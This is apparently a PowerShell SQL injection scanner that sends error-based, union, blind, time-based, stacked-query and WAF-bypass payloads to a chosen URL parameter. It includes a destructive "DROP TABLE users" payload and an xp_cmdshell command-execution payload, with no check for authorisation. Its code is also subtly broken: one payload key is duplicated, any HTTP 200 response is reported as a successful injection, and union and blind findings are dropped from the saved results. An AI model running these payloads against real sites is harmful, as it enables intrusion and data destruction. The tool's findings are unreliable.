# Bug Hunter - SQLi Testing Tool
# Usage: ./test-sqli.ps1 -Target <url> -Param <param>

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,
    [string]$Param = "id",
    [switch]$All,
    [switch]$Union,
    [switch]$Blind
)

Write-Host "[*] SQLi Testing for: $Target" -ForegroundColor Cyan

$results = @()

# SQLi Payloads
$sqliPayloads = @{
    # Error-based
    "'" = "Single quote"
    "''" = "Double quote"
    "' OR '1'='1" = "OR True"
    "' OR 1=1--" = "OR True comment"
    "' UNION SELECT NULL--" = "Union NULL"
    "' UNION SELECT NULL,NULL--" = "Union NULL 2"
    "' UNION SELECT NULL,NULL,NULL--" = "Union NULL 3"
    "'; SELECT 1/0--" = "Divide by zero"
    
    # Boolean-based (Blind)
    "' AND 1=1--" = "AND True"
    "' AND 1=2--" = "AND False"
    "' AND SLEEP(5)--" = "Sleep"
    "' AND BENCHMARK(5000000,SHA1(1))--" = "Benchmark"
    
    # Time-based
    "' WAITFOR DELAY '00:00:05'--" = "MSSQL Waitfor"
    "' AND PG_SLEEP(5)--" = "PostgreSQL Sleep"
    "' AND SLEEP(5)--" = "MySQL Sleep"
    
    # Stacked queries
    "'; DROP TABLE users--" = "Stacked DROP"
    "'; EXEC xp_cmdshell('dir')--" = "MSSQL Exec"
    
    # Comment variation
    "/**/OR/**/1=1" = "Comment OR"
    "Sel/**/ECT" = "Comment SELECT"
    "Uni/**/on" = "Comment UNION"
}

# WAF Bypass Payloads
$wafBypassPayloads = @{
    "/*!50000SELECT*/" = "MySQL 50000"
    "/*!50000UNION*/" = "MySQL 50000 UNION"
    "SeLeCt * FrOm uSeRs" = "Case variation"
    "seLECT * fROM users" = "Lowercase"
    "%27 OR %271%27=%271" = "URL encoding"
    "§' OR '1'='1" = "Unicode apostrophe"
    "/*!12345SELECT*/" = "Version comment"
}

function Test-SQLi {
    param($payload, $description)
    
    Write-Host "[*] Testing: $description" -ForegroundColor Gray
    
    try {
        $separator = if ($Target -match "\?") { "&" } else { "?" }
        $testUrl = "$Target$separator$Param=$([System.Uri]::EscapeDataString($payload))"
        
        $response = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
        
        # Check for SQL error indicators
        $errorIndicators = @(
            "SQL syntax",
            "mysql_fetch",
            "ORA-",
            "Microsoft SQL",
            "PostgreSQL",
            "SQLite",
            "Dynamic SQL",
            "SQL Error",
            "mysqli",
            "unterminated",
            "quoted string"
        )
        
        foreach ($indicator in $errorIndicators) {
            if ($response.Content -match $indicator) {
                Write-Host "[!] SQLi FOUND (Error): $description" -ForegroundColor Red
                Write-Host "[!] Indicator: $indicator" -ForegroundColor Red
                return @{Payload=$payload; Description=$description; Type="Error"; Indicator=$indicator}
            }
        }
        
        # Check for status 500
        if ($response.StatusCode -eq 500) {
            Write-Host "[!] SQLi FOUND (500): $description" -ForegroundColor Red
            return @{Payload=$payload; Description=$description; Type="Status500"}
        }
        
        # Check for timing differences (blind)
        $timingResponse = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
        if ($timingResponse -and $timingResponse.StatusCode -eq 200) {
            Write-Host "[*] Payload worked: $description" -ForegroundColor Yellow
            return @{Payload=$payload; Description=$description; Type="Blind"}
        }
        
    } catch {
        if ($_.Exception.Message -match "timeout|500") {
            Write-Host "[!] SQLi FOUND (Timeout): $description" -ForegroundColor Red
            return @{Payload=$payload; Description=$description; Type="Timeout"}
        }
    }
    
    return $null
}

# Run tests
if ($All -or -not $Union -and -not $Blind) {
    Write-Host "[*] Running full SQLi tests..." -ForegroundColor Yellow
    
    foreach ($payload in $sqliPayloads.GetEnumerator()) {
        $result = Test-SQLi -payload $payload.Key -description $payload.Value
        if ($result) { $results += $result }
    }
}

if ($Union -or $All) {
    Write-Host "[*] Testing UNION-based SQLi..." -ForegroundColor Yellow
    
    $unionPayloads = @(
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION SELECT version()--",
        "' UNION SELECT user()--",
        "' UNION SELECT database()--"
    )
    
    foreach ($payload in $unionPayloads) {
        Test-SQLi -payload $payload -description $payload
    }
}

if ($Blind -or $All) {
    Write-Host "[*] Testing blind SQLi..." -ForegroundColor Yellow
    
    $blindPayloads = @(
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(500000,SHA1(1))--"
    )
    
    foreach ($payload in $blindPayloads) {
        Test-SQLi -payload $payload -description $payload
    }
}

# WAF Bypass
Write-Host "[*] Testing WAF bypass techniques..." -ForegroundColor Yellow

foreach ($payload in $wafBypassPayloads.GetEnumerator()) {
    $result = Test-SQLi -payload $payload.Key -description "WAF: $($payload.Value)"
    if ($result) { $results += $result }
}

# Output results
Write-Host "`n[*] SQLi Testing Complete" -ForegroundColor Green
Write-Host "[*] Found $($results.Count) potential SQLi vulnerabilities" -ForegroundColor Cyan

foreach ($result in $results) {
    Write-Host "  - $($result.Description): $($result.Payload)" -ForegroundColor White
}

# Save results
$resultsFile = "./bug-hunter-output/sqli-results.txt"
if (!(Test-Path "./bug-hunter-output")) {
    New-Item -ItemType Directory -Path "./bug-hunter-output" -Force | Out-Null
}

$results | ConvertTo-Json | Set-Content $resultsFile
Write-Host "[*] Results saved to: $resultsFile" -ForegroundColor Green